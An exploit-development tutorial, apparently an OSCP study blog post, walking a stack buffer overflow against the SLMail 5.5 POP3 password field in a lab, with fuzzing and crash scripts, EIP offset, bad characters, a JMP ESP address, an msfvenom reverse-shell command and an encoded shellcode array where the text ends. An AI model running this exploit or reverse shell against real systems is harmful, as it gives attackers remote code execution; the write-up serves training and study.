---
title: "Intro to buffer overflow"
date: "September 10, 2026"
reading: "18 min read"
description: "Walking a stack-based overflow end to end: fuzzing, controlling EIP, bad characters, and landing shellcode."
tags: oscp, exploit-dev, windows
---

> **Note:** As of the 2023 exam update, OffSec removed the dedicated stack buffer overflow machine from the OSCP exam, so you are far less likely to need this end-to-end on exam day. It is still part of the PEN-200 courseware, and the workflow below — fuzz → control EIP → find bad characters → locate a `JMP ESP` → drop shellcode — is foundational for understanding memory-corruption exploitation.

A stack-based buffer overflow occurs due to a bug in a piece of software. This can be in a PE for Windows or an ELF file for Linux.
It is a vulnerability that can give a user remote code execution on the machine hosting the vulnerable software. When a program calls a function, which in turn calls more functions, each caller's execution remains suspended until the last function in the chain returns its value. All the information needed to resume this chain of functions once the last function returns — including the return address — is stored in the part of memory called the stack, which also holds the local variables the program uses to complete its tasks. Problems arise when the code in these programs does not manage its memory correctly (e.g. by not sanitizing user input), allowing external interference with the execution of the program.

```c
#include <stdio.h>
#include <string.h>

int main(int argc, char *argv[])
{
	char buffer[64];

	if (argc < 2)
	{
	printf("syntax error\r\n");
	printf("must supply at least one argument\r\n");
	return(1);
	}
	strcpy(buffer,argv[1]);
	return(0);
}
```

The code above is a simple C program whose main function takes user input from a command-line argument. It declares a local variable named `buffer` that is 64 bytes long; once the code runs, those 64 bytes are reserved for the `buffer` variable on the stack. The main function then checks whether 2 arguments were given to the program. If not, it prints an error message asking the user to supply at least one argument; otherwise it calls a string-copy function to copy the user-supplied argument into the 64 bytes allocated to `buffer`. In other words, this program grabs the user input and stores it in memory with no sanitization, so the user can provide an argument larger than 64 bytes. Despite `buffer` being allocated only 64 bytes, the excess input overwrites adjacent memory on the stack, eventually crashing the program.

First, the C program has to be compiled for the 32-bit (x86) architecture using [mingw32](https://github.com/brechtsanders/winlibs_mingw/releases/download/16.1.0posix-14.0.0-ucrt-r2/winlibs-i686-posix-dwarf-gcc-16.1.0-mingw-w64ucrt-14.0.0-r2.7z) ![](Attachments/Pasted%20image%2020260608211427.png)

then use the full path of the 32-bit gcc compiler to compile the code: `C:\Users\user\Downloads\winlibs..r2\mingw32\bin\gcc`

![](Attachments/Pasted%20image%2020260608211907.png)

As mine is directly in `C:\` we get:

![](Attachments/Pasted%20image%2020260608213014.png)

We execute the program on a 32-bit Windows host with 80 A's, to see if it will crash.

![](Attachments/Pasted%20image%2020260608214817.png)

Using a debugger we are able to get a better understanding of what happened.

![](Attachments/Pasted%20image%2020260608215213.png)

We load the PE in the debugger with 80 A's as arguments.

![](Attachments/Pasted%20image%2020260608215450.png)

We notice the ESP (1) and EIP (2) registers.

![](Attachments/Pasted%20image%2020260608215624.png)

After launching the debugger, the executable is paused; we then resume it and attempt to crash it. After doing so, we notice that EIP is being overwritten with AAAA in hex (41414141).

![](Attachments/Pasted%20image%2020260608215819.png)

This shows us that the program is vulnerable to a buffer overflow attack, as it writes the user's input to memory without sanitizing it.

## How are the bugs found?

How can one determine that a program is vulnerable to a buffer overflow by sending a certain number of bytes?

There are 3 ways of finding if there is a flaw in an application:

- Reviewing the code
	This is the easiest way to identify bugs in a program, by finding the errors in the source code. 

- Reverse engineering
	If the application is closed source, then reverse engineering techniques can be used to understand the execution flow of the program and search for bugs in it.

- Fuzzing
	Alternatively, send various malformed data to the program's input points and watch for unexpected behavior; this usually indicates that the program does not filter certain inputs correctly, which could lead to discovering a hopefully exploitable vulnerability.

### Fuzzing

Let's try some fuzzing and evaluate the [SLMail_5.5.0 mail server software](https://www.exploit-db.com/apps/12f1ab027e5374587e7e998c00682c5d-SLMail55_4433.exe) as an example
![](Attachments/Pasted%20image%2020260608222655.png)

The installation is straightforward; use the default settings and reboot the machine.

The vulnerability exists in the POP3 password field, whereby an unauthenticated user can enter an overly large password and potentially exploit the vulnerability.

Let's send an overly long password using this python script that creates a buffer array with increasing sizes, which then creates a loop around the array of buffer that sends each buffer as a password until the program crash:

```python
#!/usr/bin/python
import socket

# Create an array of buffers, while incrementing them.

buffer=["A"]
counter=100
while len(buffer) <= 30:
        buffer.append("A"*counter)
        counter=counter+200

for string in buffer:
        print "Fuzzing password with %s bytes" % len(string)
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connect=s.connect(('10.0.2.3',110))
        s.recv(1024)
        s.send('USER test\r\n')
        s.recv(1024)
        s.send('PASS '+ string + '\r\n')
        s.send('QUIT\r\n')
        s.close()
```

We will run Immunity Debugger as administrator and attach the SLMail process to the debugger:

![](Attachments/Pasted%20image%2020260609004608.png)

![](Attachments/Pasted%20image%2020260609004644.png)

Once attached to the debugger, the process is paused, click on the play button to resume the process.

![](Attachments/Pasted%20image%2020260609004920.png)

Now that the process is running inside our debugger, let's run the python script to start fuzzing.

After running the python script, we can see the fuzzer stop at the 2900-byte iteration — it can no longer connect because the previous 2700-byte password had already crashed the service, which tells us the overflow is triggered at around 2700 bytes:

![](Attachments/Pasted%20image%2020260609005508.png)

![](Attachments/Pasted%20image%2020260609005650.png)

![](Attachments/Pasted%20image%2020260609005711.png)

![](Attachments/Pasted%20image%2020260609005551.png)

The crash ended up overwriting the EBP (1) and EIP (2) registers with user-supplied input. The ESP register also points to a memory location which contains more of the user-supplied buffer.

![](Attachments/Pasted%20image%2020260609010535.png)

As the EIP controls the execution flow of the program, we want to manipulate that register to point to a place in the memory where we will have a code of our liking (shellcode) to then execute it and have a shell on the machine, this will happen by virtue of redirecting the program execution flow towards our embedded code, and then effectively execute code of our choice.

Due to the crashing that occurs, we will have to start the process (via task manager with privileges) each time we need to work on it, after closing the debugger, and if it does not start from task manager, we will have to reboot the vm each time.

For now the fuzzer confirmed the existence of the POP3 password buffer overflow: a password of roughly 2700 bytes triggers the crash, allowing for memory corruption and possibly RCE.

## How to exploit?

Our first task will be to create a simple script that replicates the crash without having to run the fuzzer each time, which will let us make subtle changes to our skeleton script and observe them more easily in the debugger.

```python
#!/usr/bin/python

import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "A"*2700

try:
    print "\nSending evil buffer..."
    s.connect(("10.0.2.3",110))
    data = s.recv(1024)
    s.send("USER username" + "\r\n")
    data = s.recv(1024)
    s.send("PASS " + buffer + "\r\n")
    print "\nDone!."
except:
    print "Could not connect to POP3!"
```

This creates a buffer variable of 2,700 A's and sends it to the SLMail server as a password.

We always will go through the process of opening Immunity as admin, attaching the SLMail process, and resuming it.

Now we run the script once everything is up and running:

![](Attachments/Pasted%20image%2020260609013313.png)

We get the same result as in the fuzzing test.

## Controlling EIP

Considering that the EIP controls the execution flow of a program, having control over this register is an important step of the exploit development process. Seeing that our A's ended up overwriting that register, we should now locate those 4 bytes by sending a unique string of 2700 bytes, noting the 4 bytes that overwrite the EIP, and locating them in the unique string so we can craft our exploit. The payload will have three parts:

- A: a long string of padding that fills the buffer up to (but not including) the saved return address;
- B: the 4 bytes that overwrite EIP (the saved return address). We will later set these to the address of a `JMP ESP` instruction so that execution is redirected into our shellcode;
- C: a short NOP sled followed by our shellcode. ESP will point at the start of C, and the NOP sled gives the shellcode decoder room to work before the real shellcode begins.

To create the unique pattern, we can use the Metasploit pattern_create.rb script:

use `locate pattern_create.rb` to find it first, then:

`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2700`

We will swap the As in the test.py script with the string generated by pattern create:

```python
#!/usr/bin/python

import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9"

try:
    print "\nSending evil buffer..."
    s.connect(("10.0.2.3",110))
    data = s.recv(1024)
    s.send("USER username" + "\r\n")
    data = s.recv(1024)
    s.send("PASS " + buffer + "\r\n")
    print "\nDone!."
except:
    print "Could not connect to POP3!"
```

None of these strings repeat themselves.

After setting everything up again, we will send our unique password buffer by executing our script:

![](Attachments/Pasted%20image%2020260609020351.png)

We notice that the EIP register now holds the value `0x39694438`. Because x86 is little-endian, the four bytes actually sitting in memory are `38 44 69 39` — the ASCII `8Di9` from our pattern. Now that the unique 4 bytes that overwrite EIP have been discovered, we need to find them in the original unique buffer using the `pattern_offset.rb` script.

We will then use `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 39694438` to find the location of those specific bytes `39 69 44 38`, which shows us:

![](Attachments/Pasted%20image%2020260609021547.png)

The 4 bytes are located at offset 2606 of the 2700 bytes. We will use this information to begin writing `buffer = A + B + C`, where A is the 2606 bytes of padding that precede B, the 4 bytes that overwrite EIP. We then append 90 C bytes so the total buffer stays at 2700 (2606 + 4 + 90 = 2700).

```python
#!/usr/bin/python

import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "A"*2606 + "B"*4 + "C"*90

try:
    print "\nSending evil buffer..."
    s.connect(("10.0.2.3",110))
    data = s.recv(1024)
    s.send("USER username" + "\r\n")
    data = s.recv(1024)
    s.send("PASS " + buffer + "\r\n")
    print "\nDone!."
except:
    print "Could not connect to POP3!"
```

After saving the script and setting everything back up, we run the script:

![](Attachments/Pasted%20image%2020260609023028.png)

We can see that the EIP was successfully overwritten by our 4 Bs in our buffer, signaling the possibility of the control of the execution flow of the SLMail application by changing these 4 bytes with something of our liking.

## Shellcode

>When sending an exploit to a victim machine, the user of the software usually has to execute it for the intended actions to occur; people are typically tricked through social engineering via phishing emails, and rarely through a 0-click vulnerability.

Remember the C in the ideal `buffer`? We would like that to contain our malicious code. So, once execution reaches the EIP overwrite, our B bytes will control EIP, which we want to point to C where our desired code resides. In short, once the program has C in memory we will redirect the execution flow to it, so in the following steps we will:

- prep the space for C;
- find a way to redirect the execution flow to C;

Following the ESP register and dumping the memory at that location, we can see that ESP points to (1), which ended up being towards the end of our buffer, just when the C starts.

![](Attachments/Pasted%20image%2020260609031757.png)

So the area filled with C seems like a good spot for our shellcode, as it will be easily accessible via the ESP register later on:

![](Attachments/Pasted%20image%2020260609031959.png)

As a typical rev shell is ~300 bytes, we should increase the C portion to be able to fit our code there.

```python
#!/usr/bin/python

import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

buffer = "A"*2606 + "B"*4 + "C"*(3500-2606-4)

try:
    print "\nSending evil buffer..."
    s.connect(("10.0.2.3",110))
    data = s.recv(1024)
    s.send("USER username" + "\r\n")
    data = s.recv(1024)
    s.send("PASS " + buffer + "\r\n")
    print "\nDone!."
except:
    print "Could not connect to POP3!"

```

After setting everything back up again, we run the script:

![](Attachments/Pasted%20image%2020260609032926.png)

We can see that EIP is still being overwritten by our 4 Bs, and following ESP in the dump shows more Cs, confirming that we increased the buffer space to fit our shellcode.

We would like to establish a shell between the machine hosting the POP3 mail server and our attacker machine. Fortunately we don't need to worry about AV evasion here, so using msfvenom to produce shellcode is fine. But a few problems present themselves: we have to find a way to execute the malicious code that gives us back a shell, and ensure the code we execute runs correctly.

The code that we would like to send in memory and ensure for its execution is made via this msfvenom command:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=5555 -f c -a x86 --platform windows
```

But if we send it like this, the program won't work. Why? The shellcode that would be generated via that command will contain all sorts of hex characters and some might have an adverse effect on our code called bad characters. A null byte `\x00` is used to terminate a string copy operation, and using it in our code will interfere with our goal, same with `\x0d`, that will truncate the code due to the POP3 server using that hex to execute that action, and the same can be applied to some other hex code that we will have to find and avoid using them in our shellcode. These bad chars can be found by sending all possible characters from \x00...\xff as part of our buffer, and seeing where anomalies occur.

```python3
#!/usr/bin/python3

#To generate list of hex characters combination use this

b = range(1, 256)
print("badchars = (")
for i in range(0, len(b), 16):
	chunk = list(b)[i:i+16]
	print("    \""+"".join(f"\\x{x:02x}" for x in chunk) + "\"")
print(")")

```

Add the output to the test.py script and swap C with it:

```python
#!/usr/bin/python

import socket


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

badchars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

#buffer = "A"*2606 + "B"*4 + "C"*90
buffer = "A"*2606 + "B"*4 + badchars

try:
    print "\nSending evil buffer..."
    s.connect(("10.0.2.3",110))
    data = s.recv(1024)
    s.send("USER username" + "\r\n")
    data = s.recv(1024)
    s.send("PASS " + buffer + "\r\n")
    print "\nDone!."
except:
    print "Could not connect to POP3!"
```

After setting everything up, we run the test.py script again:

![](Attachments/Pasted%20image%2020260609042358.png)

We can see that after 09 we do not get 0a as we should, meaning that the 10th byte is a bad character `\x0a`:

![](Attachments/Pasted%20image%2020260609042747.png)

So we delete `\x0a` from the script before running it again to check for other bad characters. We run it again after setting up the environment, to see if there are any other bad characters:

![](Attachments/Pasted%20image%2020260609043346.png)

We can see that the next and only bad character is `\x0d` as it is the only missing hex character from there and all the rest follow a normal order without anything missing.

The badchars were `\x00\x0a\x0d`, so using `-b` with msfvenom will ensure that the shellcode, if executed will execute cleanly.

```bash
 msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=5555 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
```

## Redirecting execution flow

We have found a place for the shellcode in the memory location accessible by the ESP register, knowing that we also control the EIP register. We also know which character not to use in our payload, now we should find a way to redirect the execution flow at the time of the crash to the shellcode located at the memory address that the ESP register is pointing to at crash time.

We cannot replace the `B` in `buffer` with the ESP address manually, because the ESP address changes each time we start the process. This is common in threaded applications such as SLMail, where each thread has its own reserved stack memory region allocated by the OS. Instead, we have to manipulate EIP so that it points dynamically to the ESP address at the time of the crash; this way the execution flow is redirected to the beginning of our shellcode.

![](Attachments/Pasted%20image%2020260609045438.png)

When an application runs, it is first mapped into memory along with any DLLs, drivers, or modules it may require. These modules contain extra functions and data the program needs in order to run. We can look for naturally occurring instructions such as `JMP ESP` in these DLLs and modules loaded by the SLMail program, and if we find one, we can jump to that instruction's address instead. This redirects the execution flow to whichever address is in the ESP register at the time, which is where our shellcode resides. As long as the location of this specific module in memory does not change across reboots, we should be good to go.

To get a better idea of the way these DLLs and modules are  mapped in memory we can use [mona](https://github.com/corelan/mona/blob/master/mona.py), and if it has not been set up yet in debugger, you can download it and move it to the PyCommands folder: 

![](Attachments/Pasted%20image%2020260609132456.png)

After all was set up, we use the `!mona modules` command in the debugger, which shows an extensive analysis of all the loaded modules for the debugged application:

![](Attachments/Pasted%20image%2020260609132804.png)

We will need to choose our instructions from a module that:

- has no memory protections such as ASLR or DEP/NX (ideally with Rebase and SafeSEH also set to False), so it loads at a fixed address on every reboot;
- lets us pick a gadget whose address contains no bad characters (\x00\x0a\x0d);

Only `SLMFC.DLL` matches that:

![](Attachments/Pasted%20image%2020260609133427.png)

Now that we have a DLL that will always load at the same address on each reboot, we need to find a naturally occurring `JMP ESP` or equivalent instruction within this DLL and identify the address it is located at.

Going to the executable modules list (1), we get a look at all the modules and DLLs loaded with SLMail; now let's double-click on `SLMFC.DLL` (2).

![](Attachments/Pasted%20image%2020260609134236.png)

![](Attachments/Pasted%20image%2020260609134436.png)

Searching for the instruction `jmp esp` (1) or the equivalent sequence `push esp ; retn` (2) has not given us what we are looking for:

![](Attachments/Pasted%20image%2020260609134837.png)

![](Attachments/Pasted%20image%2020260609134949.png)
![](Attachments/Pasted%20image%2020260609135146.png)

As these searches only look at the sections marked as executable within the DLL, we will have to look at the module (1) list:

![](Attachments/Pasted%20image%2020260609143959.png)

We can see that only the text section of the DLL is marked as executable. Because the DLL is not ASLR-enabled (its base address is fixed across reboots) and is not rebased, we can reliably use the address of an instruction from any section of this module, not just the ones marked as executable. And since DEP/NX is not enforced for this process, our shellcode will also be able to execute on the stack once we land there.

Let's now look for a `JMP ESP` instruction in the whole DLL using the mona script, by searching for the specific bytes in memory that make up the opcode of a `JMP ESP` instruction:

- Find the opcode of the `JMP ESP` instruction:

```bash
bellum@parrot:~/Documents/offsec$ ruby /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm > jmp esp
00000000  FFE4              jmp esp
nasm >
```

- Do a manual search in the debugger:

```bash
!mona find -s "\xff\xe4" -m slmfc.dll
```

We get a bunch of results and pick one that does not contain any bad characters:

![](Attachments/Pasted%20image%2020260609145842.png)

Let's pick the first result that is free of bad characters and verify the address actually contains a `JMP ESP` instruction, as expected:

![](Attachments/Pasted%20image%2020260609150116.png)

The debugger confirms that this address, indeed contains the instruction `JMP ESP`:

![](Attachments/Pasted%20image%2020260609150231.png)

If we now redirect EIP to 5F4A358F at the time of the crash, a `JMP ESP` instruction will execute, which then leads to the execution of the shellcode.

Let's finish up the exploit now that have all that we were looking for. We will first place the correct 4 bytes (the address of the `JMP ESP` instruction in SLMFC.DLL) in reverse, as the x86 architecture stores addresses in memory in little-endian format.


```python
#!/usr/bin/python
import socket


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# 5F4A358F   FFE4             JMP ESP
buffer = "A"*2606 + "\x8f\x35\x4a\x5f" + "C"*(3500-2606-4)

try:
    print "\nSending evil buffer..."
    s.connect(("10.0.2.3",110))
    data = s.recv(1024)
    s.send("USER username" + "\r\n")
    data = s.recv(1024)
    s.send("PASS " + buffer + "\r\n")
    print "\nDone!."
except:
    print "Could not connect to POP3!"

```

If we were to execute this exploit, the code execution flow would no longer jump to the invalid address `0x42424242` (our four `B` bytes, which point to unmapped memory and cause an access violation), but rather to the real address mentioned above, which contains a valid instruction.

After setting everything up and before executing the code, we should follow our expression, press F2 to set a breakpoint at `5F4A358F`, and run the script above:

![](Attachments/Pasted%20image%2020260609164341.png)

![](Attachments/Pasted%20image%2020260609164753.png)

![](Attachments/Pasted%20image%2020260609170254.png)

After running the python script, we can see that the program stops at the breakpoint address, and EIP points to that address, meaning the code will next execute the instruction located there. That instruction is `JMP ESP`, which transfers execution to the address held in ESP, and ESP holds `028FA110` — the beginning of our C buffer. We can now replace the Cs with actual shellcode to get a shell on the machine.


## Shellcode payload

Now that we have all the cards in our hands, let's generate the shellcode via msfvenom:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=5555 -f c -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
```

We have caught the badchars and should now have the correct shellcode, so we can complete the payload for our exploit. After adding the shellcode, we place a short NOP sled (`\x90` bytes) right before it. NOPs simply tell the CPU to advance to the next instruction, harmlessly sliding execution into the shellcode. More importantly, a self-decoding encoder like shikata_ga_nai unpacks the payload in place and uses stack space near ESP as scratch while it decodes. Because ESP sits at the very start of our payload, the decoder's own stack writes can overwrite the first bytes of the still-encoded shellcode. The NOP padding gives the decoder room to finish without stepping on its own toes.

```python
#!/usr/bin/python

import socket


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

shellcode = ("\xdb\xd2\xd9\x74\x24\xf4\xbe\xfd\xb5\x38\x18\x5a\x2b\xc9"
"\xb1\x52\x83\xea\xfc\x31\x72\x13\x03\x8f\xa6\xda\xed\x93"
"\x21\x98\x0e\x6b\xb2\xfd\x87\x8e\x83\x3d\xf3\xdb\xb4\x8d"
"\x77\x89\x38\x65\xd5\x39\xca\x0b\xf2\x4e\x7b\xa1\x24\x61"
"\x7c\x9a\x15\xe0\xfe\xe1\x49\xc2\x3f\x2a\x9c\x03\x07\x57"
"\x6d\x51\xd0\x13\xc0\x45\x55\x69\xd9\xee\x25\x7f\x59\x13"
"\xfd\x7e\x48\x82\x75\xd9\x4a\x25\x59\x51\xc3\x3d\xbe\x5c"
"\x9d\xb6\x74\x2a\x1c\x1e\x45\xd3\xb3\x5f\x69\x26\xcd\x98"
"\x4e\xd9\xb8\xd0\xac\x64\xbb\x27\xce\xb2\x4e\xb3\x68\x30"
"\xe8\x1f\x88\x95\x6f\xd4\x86\x52\xfb\xb2\x8a\x65\x28\xc9"
"\xb7\xee\xcf\x1d\x3e\xb4\xeb\xb9\x1a\x6e\x95\x98\xc6\xc1"
"\xaa\xfa\xa8\xbe\x0e\x71\x44\xaa\x22\xd8\x01\x1f\x0f\xe2"
"\xd1\x37\x18\x91\xe3\x98\xb2\x3d\x48\x50\x1d\xba\xaf\x4b"
"\xd9\x54\x4e\x74\x1a\x7d\x95\x20\x4a\x15\x3c\x49\x01\xe5"
"\xc1\x9c\x86\xb5\x6d\x4f\x67\x65\xce\x3f\x0f\x6f\xc1\x60"
"\x2f\x90\x0b\x09\xda\x6b\xdc\x3c\x1b\x71\x13\x29\x19\x75"
"\x3e\x1a\x94\x93\x2a\x4c\xf1\x0c\xc3\xf5\x58\xc6\x72\xf9"
"\x76\xa3\xb5\x71\x75\x54\x7b\x72\xf0\x46\xec\x72\x4f\x34"
"\xbb\x8d\x65\x50\x27\x1f\xe2\xa0\x2e\x3c\xbd\xf7\x67\xf2"
"\xb4\x9d\x95\xad\x6e\x83\x67\x2b\x48\x07\xbc\x88\x57\x86"
"\x31\xb4\x73\x98\x8f\x35\x38\xcc\x5f\x60\x96\xba\x19\xda"
"\x58\x14\xf0\xb1\x32\xf0\x85\xf9\x84\x86\x89\xd7\x72\x66"
"\x3b\x8e\xc2\x99\xf4\x46\xc3\xe2\xe8\xf6\x2c\x39\xa9\x3a"
"\xb6\x5e\xa6\xac\x91\xf5\x8a\xb0\x21\x20\xc8\xcc\xa1\xc0"
"\xb1\x2a\xb9\xa1\xb4\x77\x7d\x5a\xc5\xe8\xe8\x5c\x7a\x08"
"\x39")

